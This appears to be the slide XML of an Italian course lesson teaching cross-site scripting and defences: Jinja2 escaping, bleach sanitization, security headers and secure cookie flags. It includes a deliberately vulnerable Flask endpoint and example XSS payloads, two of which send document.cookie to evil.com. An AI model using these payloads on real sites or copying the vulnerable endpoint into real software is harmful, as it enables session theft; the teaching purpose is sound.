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914400"/>
            <a:ext cx="2743200" cy="27432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1371600"/>
            <a:ext cx="1828800" cy="18288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58200" y="3429000"/>
            <a:ext cx="2286000" cy="22860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228600" cy="27432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0A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LEZIONE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5156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XSS e header HTTP di sicurezza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6FD8E0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>JavaScript dell'attaccante nel browser della vittima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2011680" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst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⏱  Lezione 5 · 2 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0D8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Corso IFTS STEM · Ing. Alessandro Manneschi · 2024/2025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🎯  Obiettivi della lezione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0" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F1F4F8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1">
                <a:solidFill>
                  <a:srgbClr val="00A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>obiettivi</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Oval 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="118872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1887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26187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Cos'è Cross-Site Scripting (XSS) e i suoi 3 tipi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196596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9659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03911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Eseguire XSS Reflected e XSS Stored</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Oval 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="274320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7432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81635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Difendersi con escape automatico (Jinja2)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352044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352044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59359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Conoscere i 6 header HTTP di sicurezza fondamentali</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Oval 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="429768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42976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37083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Configurare cookie sicuri (Secure, HttpOnly, SameSite)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📖  Una storia: il commento 'rilanciato'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00A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Senza chiedere password, l'attaccante ha l'identità della vittima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Immagina un forum dove gli utenti pubblicano commenti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Un utente cattivo pubblica un commento che CONTIENE codice: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'Bel post! &lt;script&gt;fetch("evil.com?c="+document.cookie)&lt;/script&gt;'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Il forum lo salva pensando sia testo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Quando un altro utente apre la pagina, il SUO browser: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1. Legge il commento dal DB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2. Trova &lt;script&gt;...&lt;/script&gt; e lo ESEGUE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3. Manda il SUO cookie di sessione all'attaccante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0" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="00A0B0"/>
                </a:solidFill>
                <a:latin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286000"/>
            <a:ext cx="9144000" cy="3200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1">
                <a:solidFill>
                  <a:srgbClr val="0F2D52"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.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5029200"/>
            <a:ext cx="1828800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="3810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🌐  Come funziona un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1. Scarica HTML della pagina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2. Applica CSS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3. Trova tag &lt;script&gt; e li ESEGUE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4. Permette al JS di accedere a DOM, cookie, fare richieste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Se l'attaccante riesce a far eseguire del SUO JS nella tua pagina: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→ ha accesso a cookie sessione, dati form, può agire come l'utente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 3 tipi di XSS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REFLECTED — il payload è nell'URL, riflesso nella pagina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Vittima: chi clicca il link malevolo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STORED — il payload è salvato nel DB (commenti, post)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Vittima: chiunque visita la pagina (più grave)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DOM-BASED — JS della pagina prende valore da location.hash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Più raro, più subdolo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XSS Reflected — un attacco via link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64592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🚩 ANTI-PATTERN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solidFill>
            <a:srgbClr val="2D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216152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216152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216152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612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BD0D8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  app.py  — 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1247120" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1E28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457200" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="24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600200"/>
            <a:ext cx="10607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Endpoint Flask vulnerabile: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@app.route("/cerca")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def cerca():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q = request.args.get("q", "")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return f"&lt;h1&gt;Risultati per: {q}&lt;/h1&gt;"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L'attaccante prepara un URL e lo manda alla vittima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(email phishing, chat, social, banner ads):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https://example.com/cerca?q=&lt;script&gt;alert('XSS')&lt;/script&gt;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La pagina restituita dal server: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&lt;h1&gt;Risultati per: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/h1&gt;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Il browser ESEGUE lo script. Innocuo? Sostituisci con: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&lt;script&gt;fetch('https://evil.com/log?c='+document.cookie)&lt;/script&gt;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→ Cookie di sessione della vittima inviato all'attaccante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600200"/>
            <a:ext cx="3657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2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3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4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5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6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7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8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9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10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11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12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13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14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15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16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1">
                <a:solidFill>
                  <a:srgbClr val="E63946"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠  Reflected: il payload è nel link. Vittima: chi clicca.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Flusso di un attacco XSS Stored</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="cap5_xss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88136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Dal commento malevolo al furto del cookie di sessione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Difesa: escape automatico (Jinja2)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64592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✅ JINJA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solidFill>
            <a:srgbClr val="2D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216152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216152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216152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612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BD0D8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  app.py  —  jinja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1247120" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1E28"/>
          </a:solidFill>
          <a:ln w="19050"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457200" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="24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600200"/>
            <a:ext cx="10607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&lt;!-- Template Jinja2 --&gt;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&lt;h1&gt;Risultati per: {{ query }}&lt;/h1&gt;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Se query = "&lt;script&gt;alert(1)&lt;/script&gt;"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Jinja2 trasforma in: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;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Il browser mostra come TESTO, NON esegue → XSS neutralizzata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Equivalenti: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Java + Thymeleaf:  &lt;span th:text="${query}"&gt;&lt;/span&gt;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PHP + Twig:        {{ query }}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React:             {query}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600200"/>
            <a:ext cx="3657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2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3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4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5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6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7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8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9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10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1">
                <a:solidFill>
                  <a:srgbClr val="06A77D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓  Default escape è SEMPRE attivo. Non disabilitarlo con |safe.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⚠  Il pericolo del |safe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Jinja2: {{ comment | safe }}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Disabilita l'escape → XSS GARANTITA su input utente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Equivalenti pericolosi in altri framework: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Vue: v-html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React: dangerouslySetInnerHTML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Blade: {!! $x !!}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Usali solo su testo statico che hai scritto TU.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Mai, MAI, MAI su input utente.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Quando l'utente DEVE scrivere HTML ricco: bleach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64592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✅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solidFill>
            <a:srgbClr val="2D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216152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216152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216152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612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BD0D8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  app.py  — 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1247120" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1E28"/>
          </a:solidFill>
          <a:ln w="19050"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457200" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="24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600200"/>
            <a:ext cx="10607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Scenario: commenti con grassetto/corsivo/link → escape NON va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Soluzione: sanitization con bleach (whitelist tag+attributi)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import bleach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ALLOWED_TAGS = ["p", "b", "strong", "i", "em", "a", "br"]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ALLOWED_ATTRS = {"a": ["href"]}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ALLOWED_PROTO = ["http", "https"]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safe_html = bleach.clean(user_html,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                      tags=ALLOWED_TAGS,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                      attributes=ALLOWED_ATTRS,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                      protocols=ALLOWED_PROTO,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                      strip=True)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Input:  &lt;p&gt;Ciao &lt;script&gt;alert(1)&lt;/script&gt;&lt;a href="javascript:.."&gt;x&lt;/a&gt;&lt;/p&gt;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Output: &lt;p&gt;Ciao &lt;a&gt;x&lt;/a&gt;&lt;/p&gt;     ← script rimosso, href javascript: rimosso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600200"/>
            <a:ext cx="3657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2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3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4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5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6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7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8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9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10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11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12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13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14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15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16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1">
                <a:solidFill>
                  <a:srgbClr val="06A77D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓  bleach mantiene tag voluti, butta tutto il resto. JS in DOMPurify.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Header HTTP di sicurezza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Configurazione rapida, difese potenti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 6 header di sicurezza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Header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Cosa fa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Strict-Transport-Security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Forza HTTPS dopo prima visita (HSTS)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Content-Security-Policy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Limita risorse caricabili (anti-XSS L2)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X-Frame-Options: DENY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Blocca clickjacking via iframe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X-Content-Type-Options: nosniff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Blocca MIME sniffing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Referrer-Policy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Controlla cosa va nel Referer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Permissions-Policy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Limita API browser (camera, mic)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Cookie sicuri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64592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✅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solidFill>
            <a:srgbClr val="2D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216152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216152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216152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612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BD0D8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  app.py  — 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1247120" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1E28"/>
          </a:solidFill>
          <a:ln w="19050"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457200" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="24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600200"/>
            <a:ext cx="10607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Configurazione Flask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app.config.update(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SESSION_COOKIE_SECURE=True,      # Solo HTTPS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SESSION_COOKIE_HTTPONLY=True,     # JS NON può leggerlo (anti-XSS)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SESSION_COOKIE_SAMESITE="Lax",    # Anti-CSRF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PERMANENT_SESSION_LIFETIME=3600,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Risultato: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Set-Cookie: session=abc;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            Secure; HttpOnly; SameSite=Lax;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            Path=/; Max-Age=3600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600200"/>
            <a:ext cx="3657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2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3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4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5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6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7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8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9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10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11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1">
                <a:solidFill>
                  <a:srgbClr val="06A77D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓  3 attributi + 1 config = -90% rischio session hijacking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📌  Cosa portare a casa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4401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401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4401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4401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XSS = JavaScript dell'attaccante eseguito nel browser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545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45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3545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3545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3 tipi: Reflected (link), Stored (DB, peggiore), DOM-based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689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689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32689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2689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Jinja2 fa escape di default — NON disabilitarlo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1833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833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41833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1833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Per HTML ricco voluto: bleach con whitelist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0977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977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50977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50977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Cookie sessione: Secure + HttpOnly + SameSite (sempre)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Lab + sicurezza headers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Test del proprio sito con securityheaders.com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15400" y="228600"/>
            <a:ext cx="2286000" cy="22860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3749040"/>
            <a:ext cx="1645920" cy="164592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4800600"/>
            <a:ext cx="1371600" cy="13716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0" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Domande?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840480"/>
            <a:ext cx="2926080" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="5080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0A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Riepilogo · Q&amp;A · Discussione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97840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1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>➜  Prossima lezione: L6 — Input validation + Supply chain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